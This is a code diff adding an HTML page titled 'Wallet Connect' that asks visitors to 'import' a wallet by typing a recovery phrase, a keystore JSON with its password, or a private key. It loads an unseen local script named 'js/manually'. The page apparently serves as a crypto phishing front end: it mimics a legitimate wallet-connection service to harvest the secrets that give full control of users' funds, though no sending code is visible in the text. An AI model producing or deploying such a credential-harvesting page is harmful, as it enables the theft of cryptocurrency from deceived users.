@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Wallet Connect</title>
+    <link
+      href="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: #f8f9fa;
+      }
+      .wallet-container {
+        width: 500px;
+        text-align: center;
+      }
+      .nav-tabs {
+        justify-content: center;
+      }
+      .btn-primary {
+        background-color: #007bff;
+      }
+      .form-control {
+        border: 1px solid #ced4da;
+        border-radius: 0;
+      }
+      @media (max-width: 768px) {
+        .wallet-container {
+          width: 100%;
+          padding: 0 15px;
+          box-sizing: border-box;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wallet-container">
+      <img src="img/logo.png" alt="Logo" class="mb-4" />
+      <h2>Import Wallet</h2>
+      <ul class="nav nav-tabs" id="walletTab" role="tablist">
+        <li class="nav-item">
+          <a
+            class="nav-link active"
+            id="phrase-tab"
+            data-toggle="tab"
+            href="#phrase"
+            role="tab"
+            >Phrase</a
+          >
+        </li>
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            id="keystore-tab"
+            data-toggle="tab"
+            href="#keystore"
+            role="tab"
+            >Keystore JSON</a
+          >
+        </li>
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            id="privatekey-tab"
+            data-toggle="tab"
+            href="#privatekey"
+            role="tab"
+            >Private Key</a
+          >
+        </li>
+      </ul>
+
+      <div class="tab-content mt-4">
+        <div class="tab-pane fade show active" id="phrase" role="tabpanel">
+          <div class="form-group">
+            <textarea
+              class="form-control"
+              rows="3"
+              placeholder="Phrase (12 or 24 words)"
+            ></textarea>
+          </div>
+          <button class="btn btn-primary btn-block">Import</button>
+          <small class="form-text text-muted"
+            >Typically 12 (sometimes 24) words separated by single spaces</small
+          >
+        </div>
+
+        <div class="tab-pane fade" id="keystore" role="tabpanel">
+          <div class="form-group">
+            <textarea
+              class="form-control"
+              rows="3"
+              placeholder="Keystore JSON"
+            ></textarea>
+          </div>
+          <div class="form-group">
+            <input
+              type="password"
+              class="form-control"
+              placeholder="Password"
+            />
+          </div>
+          <button class="btn btn-primary btn-block">Import</button>
+          <small class="form-text text-muted"
+            >Several lines of text beginning with {"..."} plus the password you
+            used to encrypt it</small
+          >
+        </div>
+
+        <div class="tab-pane fade" id="privatekey" role="tabpanel">
+          <div class="form-group">
+            <textarea
+              class="form-control"
+              rows="2"
+              placeholder="Private Key"
+            ></textarea>
+          </div>
+          <button class="btn btn-primary btn-block">Import</button>
+          <small class="form-text text-muted"
+            >Typically 64 alphanumeric characters</small
+          >
+        </div>
+      </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+    <script src="js/manually"></script>
+  </body>
+</html>
